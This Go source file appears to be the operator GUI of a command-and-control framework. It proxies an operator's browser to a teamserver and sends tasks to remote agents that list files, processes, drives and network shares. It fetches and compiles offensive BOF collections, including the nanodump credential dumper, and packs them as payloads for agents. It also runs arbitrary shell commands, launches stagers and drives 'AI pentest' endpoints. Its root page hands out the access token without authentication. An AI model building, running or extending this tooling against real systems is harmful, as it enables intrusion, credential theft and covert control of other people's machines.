package client

// gui.go — local web GUI server. Serves the operator HTML interface at
// 127.0.0.1:PORT and proxies all API requests to the teamserver via the
// existing mTLS operator connection. The token is injected into the HTML so
// the browser auto-logs in without any manual copy-paste.

import (
	"bufio"
	"context"
	"crypto/rand"
	"embed"
	"encoding/hex"
	"encoding/json"
	"bytes"
	"encoding/base64"
	"fmt"
	"io"
	"io/fs"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"time"
)

//go:embed web/index.html
var guiFS embed.FS

var guiToken string

func genGUIToken() string {
	b := make([]byte, 16)
	rand.Read(b)
	guiToken = hex.EncodeToString(b)
	return guiToken
}

// guiState tracks the currently running GUI server so it can be stopped.
var guiState struct {
	mu   sync.Mutex
	srv  *http.Server
	port int
	tok  string
}

// GUIStatus returns whether the GUI is currently running, plus its port and token.
func GUIStatus() (running bool, port int, token string) {
	guiState.mu.Lock()
	defer guiState.mu.Unlock()
	return guiState.srv != nil, guiState.port, guiState.tok
}

// StopGUI shuts down the running GUI server. Returns an error if none is running.
func StopGUI() error {
	guiState.mu.Lock()
	srv := guiState.srv
	guiState.mu.Unlock()
	if srv == nil {
		return fmt.Errorf("GUI no está corriendo")
	}
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	err := srv.Shutdown(ctx)
	guiState.mu.Lock()
	guiState.srv = nil
	guiState.port = 0
	guiState.tok = ""
	guiState.mu.Unlock()
	return err
}

// StartGUI starts the web GUI server on host:port.
// The GUI proxies all /api/* and /events requests to the teamserver via mTLS.
// Returns an error if a GUI is already running.
func StartGUI(c *Client, host string, port int) (string, error) {
	guiState.mu.Lock()
	if guiState.srv != nil {
		existing := guiState.port
		guiState.mu.Unlock()
		return "", fmt.Errorf("GUI ya está corriendo en :%d (use 'gui stop' primero)", existing)
	}
	guiState.mu.Unlock()

	tok := genGUIToken()

	// SSE needs a client without timeout so long-lived streams aren't cut.
	sseClient := &http.Client{Transport: c.http.Transport}

	p := &guiProxy{c: c, sse: sseClient}
	mux := http.NewServeMux()

	mux.HandleFunc("/events", p.authMid(p.proxySSE))
	mux.HandleFunc("/token", p.tokenCheck)
	mux.HandleFunc("/api/", p.authMid(p.proxyAPI))
	mux.HandleFunc("/exec", p.authMid(p.execSSE))   // local operator shell
	mux.HandleFunc("/bofs", p.authMid(p.handleBofs)) // BOF list + resolve
	mux.HandleFunc("/browse/ls",     p.authMid(p.handleBrowseLS))     // file browser
	mux.HandleFunc("/browse/drives", p.authMid(p.handleBrowseDrives)) // list drives
	mux.HandleFunc("/browse/shares", p.authMid(p.handleBrowseShares)) // list net shares
	mux.HandleFunc("/browse/ps",     p.authMid(p.handleBrowsePS))     // process browser
	mux.HandleFunc("/ai/pentest",   p.authMid(p.handleAIPentest))
	mux.HandleFunc("/ai/stream",    p.authMid(p.handleAIStream))
	mux.HandleFunc("/ai/step",      p.authMid(p.handleAIStep))
	mux.HandleFunc("/ai/ollama-url",    p.authMid(p.handleOllamaURL))
	mux.HandleFunc("/ai/ollama-models", p.authMid(p.handleOllamaModels))
	mux.HandleFunc("/ai/console-chat", p.authMid(p.handleAIConsoleChat))
	mux.HandleFunc("/ai/console-task", p.authMid(p.handleAIConsoleTask))
	mux.HandleFunc("/ai/claude-auth",  p.authMid(p.handleClaudeAuth))
	mux.HandleFunc("/", p.serveStatic) // no auth: token is injected into the HTML itself

	srv := &http.Server{
		Addr:        fmt.Sprintf("%s:%d", host, port),
		Handler:     mux,
		ReadTimeout: 30 * time.Second,
	}

	// Bind synchronously so port conflicts surface as an error to the caller.
	ln, err := net.Listen("tcp", srv.Addr)
	if err != nil {
		return "", fmt.Errorf("bind %s:%d: %w", host, port, err)
	}

	guiState.mu.Lock()
	guiState.srv = srv
	guiState.port = port
	guiState.tok = tok
	guiState.mu.Unlock()

	go func() {
		if err := srv.Serve(ln); err != http.ErrServerClosed {
			fmt.Printf("[!] GUI: %v\n", err)
		}
	}()
	return tok, nil
}

type guiProxy struct {
	c   *Client
	sse *http.Client
}

func (p *guiProxy) authMid(h http.HandlerFunc) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		tok := ""
		if auth := r.Header.Get("Authorization"); strings.HasPrefix(auth, "Bearer ") {
			tok = strings.TrimPrefix(auth, "Bearer ")
		}
		if tok == "" {
			tok = r.URL.Query().Get("token")
		}
		if tok != guiToken {
			w.Header().Set("Content-Type", "application/json")
			w.WriteHeader(http.StatusUnauthorized)
			json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "unauthorized"})
			return
		}
		h(w, r)
	}
}

func (p *guiProxy) tokenCheck(w http.ResponseWriter, r *http.Request) {
	tok := r.URL.Query().Get("token")
	if tok == "" {
		if auth := r.Header.Get("Authorization"); strings.HasPrefix(auth, "Bearer ") {
			tok = strings.TrimPrefix(auth, "Bearer ")
		}
	}
	w.Header().Set("Content-Type", "application/json")
	if tok == guiToken {
		json.NewEncoder(w).Encode(map[string]any{"ok": true})
	} else {
		w.WriteHeader(http.StatusUnauthorized)
		json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "invalid token"})
	}
}

// serveStatic injects the GUI token as window.__GUI_TOKEN__ so the page
// auto-logs in without requiring manual token entry.
func (p *guiProxy) serveStatic(w http.ResponseWriter, r *http.Request) {
	data, err := guiFS.ReadFile("web/index.html")
	if err != nil {
		http.Error(w, "GUI unavailable", http.StatusNotFound)
		return
	}
	// Inject token + version into JS globals. Version = guiToken so it changes
	// every restart; the page self-reloads when the stored version differs.
	origin := "http://" + r.Host
	injection := fmt.Sprintf(
		`<script>window.__GUI_TOKEN__=%q;window.__GUI_VER__=%q;</script></head>`,
		guiToken, guiToken,
	)
	html := strings.Replace(string(data), "</head>", injection, 1)
	html = strings.Replace(html, `id="login-url" value=""`, `id="login-url" value="`+origin+`"`, 1)
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Header().Set("Cache-Control", "no-store, no-cache, must-revalidate")
	w.Header().Set("Pragma", "no-cache")
	w.Header().Set("Expires", "0")
	fmt.Fprint(w, html)
}

// proxyAPI forwards REST requests to the teamserver's operator API via mTLS.
// The Authorization header carrying the GUI token is stripped; the mTLS cert
// on the connection handles operator authentication on the server side.
func (p *guiProxy) proxyAPI(w http.ResponseWriter, r *http.Request) {
	target := p.c.base + r.URL.RequestURI()

	pr, err := http.NewRequestWithContext(r.Context(), r.Method, target, r.Body)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	for k, vs := range r.Header {
		lk := strings.ToLower(k)
		if lk == "authorization" || lk == "host" {
			continue
		}
		pr.Header[k] = vs
	}

	// Use the no-timeout client for streaming endpoints and long-running commands.
	httpClient := p.c.http
	if r.URL.Query().Get("stream") == "1" || strings.HasSuffix(r.URL.Path, "/stager/run") {
		httpClient = p.sse
	}

	resp, err := httpClient.Do(pr)
	if err != nil {
		http.Error(w, err.Error(), http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()

	for k, vs := range resp.Header {
		for _, v := range vs {
			w.Header().Add(k, v)
		}
	}
	w.WriteHeader(resp.StatusCode)

	// For SSE streaming responses, flush after each chunk so the browser
	// sees events immediately rather than buffering the whole response.
	if strings.Contains(resp.Header.Get("Content-Type"), "text/event-stream") {
		flusher, ok := w.(http.Flusher)
		if ok {
			buf := make([]byte, 4096)
			for {
				n, rerr := resp.Body.Read(buf)
				if n > 0 {
					w.Write(buf[:n]) //nolint:errcheck
					flusher.Flush()
				}
				if rerr != nil {
					break
				}
			}
			return
		}
	}
	io.Copy(w, resp.Body)
}

// proxySSE relays the teamserver's /api/events SSE stream to the browser.
func (p *guiProxy) proxySSE(w http.ResponseWriter, r *http.Request) {
	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "SSE not supported", http.StatusInternalServerError)
		return
	}

	req, err := http.NewRequestWithContext(r.Context(), http.MethodGet, p.c.base+"/api/events", nil)
	if err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	req.Header.Set("Accept", "text/event-stream")
	req.Header.Set("Cache-Control", "no-cache")

	resp, err := p.sse.Do(req)
	if err != nil {
		http.Error(w, "event stream unavailable: "+err.Error(), http.StatusBadGateway)
		return
	}
	defer resp.Body.Close()

	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	w.Header().Set("X-Accel-Buffering", "no")
	flusher.Flush()

	// Relay SSE lines line-by-line, flushing each one so the browser sees
	// events immediately without waiting for a buffer to fill.
	scanner := bufio.NewScanner(resp.Body)
	for scanner.Scan() {
		fmt.Fprintf(w, "%s\n", scanner.Text())
		flusher.Flush()
	}
}

// execSSE runs a shell command on the Kali host and streams stdout+stderr to
// the browser via Server-Sent Events.  Each output line becomes a
// "data: <text>\n\n" event.  A final "event: exit\ndata: <code>\n\n" signals
// completion so the browser knows when the command finished.
//
// POST /exec  body: {"cmd": "certipy find ..."}
// Authenticated via authMid (same GUI token as all other endpoints).
func (p *guiProxy) execSSE(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
		return
	}
	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "streaming not supported", http.StatusInternalServerError)
		return
	}

	var body struct {
		Cmd string `json:"cmd"`
	}
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil || strings.TrimSpace(body.Cmd) == "" {
		http.Error(w, "missing cmd", http.StatusBadRequest)
		return
	}

	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	w.Header().Set("X-Accel-Buffering", "no")
	flusher.Flush()

	ctx, cancel := context.WithCancel(r.Context())
	defer cancel()

	// Wrap in "sh -c '...' 2>&1" so stderr merges into the same stream.
	cmd := exec.CommandContext(ctx, "sh", "-c", body.Cmd+" 2>&1")
	// Run from the binary's directory so relative paths like payloads/ work correctly
	// regardless of where the operator started the client process.
	if exe, err := os.Executable(); err == nil {
		cmd.Dir = filepath.Dir(exe)
	}
	// Force color output: tools detect no-TTY and strip ANSI unless told otherwise.
	cmd.Env = append(os.Environ(),
		"TERM=xterm-256color",
		"COLORTERM=truecolor",
		"FORCE_COLOR=1",
		"CLICOLOR_FORCE=1",
		"ANSIBLE_FORCE_COLOR=1",
		"PYTHONUNBUFFERED=1",
	)
	pipe, err := cmd.StdoutPipe()
	if err != nil {
		fmt.Fprintf(w, "data: [error] %s\n\nevent: exit\ndata: 1\n\n", err.Error())
		flusher.Flush()
		return
	}
	if err := cmd.Start(); err != nil {
		fmt.Fprintf(w, "data: [error] %s\n\nevent: exit\ndata: 1\n\n", err.Error())
		flusher.Flush()
		return
	}

	scanner := bufio.NewScanner(pipe)
	scanner.Split(scanCRLFLines)
	for scanner.Scan() {
		fmt.Fprintf(w, "data: %s\n\n", scanner.Text())
		flusher.Flush()
	}

	exitCode := 0
	if err := cmd.Wait(); err != nil {
		if ee, ok2 := err.(*exec.ExitError); ok2 {
			exitCode = ee.ExitCode()
		} else {
			exitCode = 1
		}
	}
	fmt.Fprintf(w, "event: exit\ndata: %d\n\n", exitCode)
	flusher.Flush()
}

// scanCRLFLines is a bufio.SplitFunc that splits on \r, \n, or \r\n.
// This ensures that \r-terminated progress bar lines (e.g. from rich/netexec)
// are sent as individual SSE events so the JS noise filter can drop them.
func scanCRLFLines(data []byte, atEOF bool) (advance int, token []byte, err error) {
	if atEOF && len(data) == 0 {
		return 0, nil, nil
	}
	for i := 0; i < len(data); i++ {
		if data[i] == '\n' {
			return i + 1, data[:i], nil
		}
		if data[i] == '\r' {
			if i+1 < len(data) && data[i+1] == '\n' {
				return i + 2, data[:i], nil
			}
			return i + 1, data[:i], nil
		}
	}
	if atEOF {
		return len(data), data, nil
	}
	return 0, nil, nil
}

// handleBofs serves GET /bofs (list) and POST /bofs (resolve name → payload).
func (p *guiProxy) handleBofs(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	action := r.URL.Query().Get("action")

	// POST ?action=install — run git clone/pull for all BOF collections
	if r.Method == "POST" && action == "install" {
		bofDir := getBofDir()
		os.MkdirAll(bofDir, 0755)
		type repo struct{ label, url, dir string }
		repos := []repo{
			{"BofAllTheThings", "https://github.com/N7WEra/BofAllTheThings", "BofAllTheThings"},
			{"situational-awareness", "https://github.com/TrustedSec/CS-Situational-Awareness-BOF", "situational-awareness"},
			{"nanodump", "https://github.com/fortra/nanodump", "nanodump"},
			{"outflank", "https://github.com/outflanknl/C2-Tool-Collection", "outflank"},
			{"ajpc500", "https://github.com/ajpc500/BOFs", "ajpc500"},
		}
		var lines []string
		for _, rp := range repos {
			dest := filepath.Join(bofDir, rp.dir)
			var out []byte
			var err error
			if _, e := os.Stat(filepath.Join(dest, ".git")); e == nil {
				out, err = exec.Command("git", "-C", dest, "pull", "-q", "--ff-only").CombinedOutput()
				lines = append(lines, fmt.Sprintf("[~] %s: %s", rp.label, strings.TrimSpace(string(out))))
			} else {
				out, err = exec.Command("git", "clone", "-q", "--depth", "1", rp.url, dest).CombinedOutput()
				if err != nil {
					lines = append(lines, fmt.Sprintf("[!] %s: %s", rp.label, strings.TrimSpace(string(out))))
				} else {
					lines = append(lines, fmt.Sprintf("[+] %s: clonado", rp.label))
				}
			}
			// Outflank ships .c sources only — compile after clone/pull
			if rp.dir == "outflank" {
				makefile := filepath.Join(dest, "BOF", "Makefile")
				if _, e := os.Stat(makefile); e == nil {
					lines = append(lines, "[*] outflank: compilando BOFs (mingw)…")
					out, err = exec.Command("make", "-C", filepath.Join(dest, "BOF")).CombinedOutput()
					if err != nil {
						lines = append(lines, fmt.Sprintf("[!] outflank compile: %s", strings.TrimSpace(string(out))))
					} else {
						n := 0
						filepath.WalkDir(filepath.Join(dest, "BOF"), func(p string, d fs.DirEntry, _ error) error {
							if !d.IsDir() && strings.HasSuffix(p, ".x64.o") { n++ }
							return nil
						})
						lines = append(lines, fmt.Sprintf("[+] outflank: %d .x64.o compilados", n))
					}
				}
			}
		}
		total := len(bofNames())
		json.NewEncoder(w).Encode(map[string]any{"ok": true, "lines": lines, "total": total})
		return
	}

	// POST — resolve BOF name, pack args, return base64 payload+args
	if r.Method == "POST" {
		var req struct {
			Name string `json:"name"`
			Args string `json:"args"`
		}
		json.NewDecoder(r.Body).Decode(&req)

		bofPath := resolveBof(req.Name)
		if bofPath == "" {
			w.WriteHeader(http.StatusNotFound)
			json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": "BOF not found: " + req.Name})
			return
		}
		coffData, err := os.ReadFile(bofPath)
		if err != nil {
			w.WriteHeader(http.StatusInternalServerError)
			json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": err.Error()})
			return
		}
		var argsBuf bytes.Buffer
		for _, spec := range strings.Fields(req.Args) {
			packed, e := packBOFArg(spec)
			if e != nil {
				w.WriteHeader(http.StatusBadRequest)
				json.NewEncoder(w).Encode(map[string]any{"ok": false, "error": e.Error()})
				return
			}
			argsBuf.Write(packed)
		}
		argsB64 := ""
		if argsBuf.Len() > 0 {
			argsB64 = base64.StdEncoding.EncodeToString(argsBuf.Bytes())
		}
		json.NewEncoder(w).Encode(map[string]any{
			"ok":      true,
			"name":    filepath.Base(bofPath),
			"payload": base64.StdEncoding.EncodeToString(coffData),
			"args":    argsB64,
		})
		return
	}

	// GET — return grouped list of available BOFs
	bofDir := getBofDir()
	entries := listBofFiles(bofDir)
	type bofJSON struct {
		Name string `json:"name"`
		Path string `json:"path"`
		Repo string `json:"repo"`
	}
	byRepo := map[string][]bofJSON{}
	for _, e := range entries {
		byRepo[e.repo] = append(byRepo[e.repo], bofJSON{e.name, e.path, e.repo})
	}
	repos := make([]string, 0, len(byRepo))
	for rp := range byRepo {
		repos = append(repos, rp)
	}
	sort.Strings(repos)
	type repoJSON struct {
		Name string    `json:"name"`
		Bofs []bofJSON `json:"bofs"`
	}
	var result []repoJSON
	for _, rp := range repos {
		result = append(result, repoJSON{rp, byRepo[rp]})
	}
	json.NewEncoder(w).Encode(map[string]any{"ok": true, "repos": result, "total": len(entries)})
}

// ── Browse handlers (file browser + process browser) ─────────────────────────

// handleBrowseLS sends an LS_JSON task to the agent and returns the result.
// GET /browse/ls?agent=<id>&path=<path>&timeout=<seconds>
func (p *guiProxy) handleBrowseLS(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	agentID := r.URL.Query().Get("agent")
	path    := r.URL.Query().Get("path")
	if agentID == "" {
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{"error": "missing agent"})
		return
	}
	if path == "" {
		path = "."
	}
	tSec := 30
	if ts := r.URL.Query().Get("timeout"); ts != "" {
		if v, err := fmt.Sscanf(ts, "%d", &tSec); v == 0 || err != nil {
			tSec = 30
		}
	}

	taskID, err := p.c.QueueTask(agentID, "LS_JSON", path, nil)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
		return
	}
	res, err := p.c.WaitResult(agentID, taskID, time.Duration(tSec)*time.Second)
	if err != nil {
		w.WriteHeader(http.StatusGatewayTimeout)
		json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
		return
	}
	if res.Error != "" {
		json.NewEncoder(w).Encode(map[string]string{"error": res.Error})
		return
	}
	// res.Output is already JSON from the agent
	w.Write([]byte(res.Output))
}

// handleBrowsePS sends a PS_JSON task to the agent and returns the result.
// GET /browse/ps?agent=<id>&timeout=<seconds>
func (p *guiProxy) handleBrowsePS(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	agentID := r.URL.Query().Get("agent")
	if agentID == "" {
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{"error": "missing agent"})
		return
	}
	tSec := 30
	if ts := r.URL.Query().Get("timeout"); ts != "" {
		if v, err := fmt.Sscanf(ts, "%d", &tSec); v == 0 || err != nil {
			tSec = 30
		}
	}

	taskID, err := p.c.QueueTask(agentID, "PS_JSON", "", nil)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
		return
	}
	res, err := p.c.WaitResult(agentID, taskID, time.Duration(tSec)*time.Second)
	if err != nil {
		w.WriteHeader(http.StatusGatewayTimeout)
		json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
		return
	}
	if res.Error != "" {
		json.NewEncoder(w).Encode(map[string]string{"error": res.Error})
		return
	}
	// res.Output is already JSON array from the agent
	fmt.Fprintf(w, `{"procs":%s}`, res.Output)
}

// handleBrowseDrives sends a DRIVES task to the agent and returns the drive list.
// GET /browse/drives?agent=<id>&timeout=<seconds>
func (p *guiProxy) handleBrowseDrives(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	agentID := r.URL.Query().Get("agent")
	if agentID == "" {
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{"error": "missing agent"})
		return
	}
	tSec := 30
	if ts := r.URL.Query().Get("timeout"); ts != "" {
		if v, err := fmt.Sscanf(ts, "%d", &tSec); v == 0 || err != nil {
			tSec = 30
		}
	}
	taskID, err := p.c.QueueTask(agentID, "DRIVES", "", nil)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
		return
	}
	res, err := p.c.WaitResult(agentID, taskID, time.Duration(tSec)*time.Second)
	if err != nil {
		w.WriteHeader(http.StatusGatewayTimeout)
		json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
		return
	}
	if res.Error != "" {
		json.NewEncoder(w).Encode(map[string]string{"error": res.Error})
		return
	}
	w.Write([]byte(res.Output))
}

// handleBrowseShares sends a NET_SHARES task to the agent and returns the share list.
// GET /browse/shares?agent=<id>&host=<hostname>&timeout=<seconds>
func (p *guiProxy) handleBrowseShares(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	agentID := r.URL.Query().Get("agent")
	host    := r.URL.Query().Get("host")
	if agentID == "" || host == "" {
		w.WriteHeader(http.StatusBadRequest)
		json.NewEncoder(w).Encode(map[string]string{"error": "missing agent or host"})
		return
	}
	tSec := 30
	if ts := r.URL.Query().Get("timeout"); ts != "" {
		if v, err := fmt.Sscanf(ts, "%d", &tSec); v == 0 || err != nil {
			tSec = 30
		}
	}
	taskID, err := p.c.QueueTask(agentID, "NET_SHARES", host, nil)
	if err != nil {
		w.WriteHeader(http.StatusInternalServerError)
		json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
		return
	}
	res, err := p.c.WaitResult(agentID, taskID, time.Duration(tSec)*time.Second)
	if err != nil {
		w.WriteHeader(http.StatusGatewayTimeout)
		json.NewEncoder(w).Encode(map[string]string{"error": err.Error()})
		return
	}
	if res.Error != "" {
		json.NewEncoder(w).Encode(map[string]string{"error": res.Error})
		return
	}
	w.Write([]byte(res.Output))
}
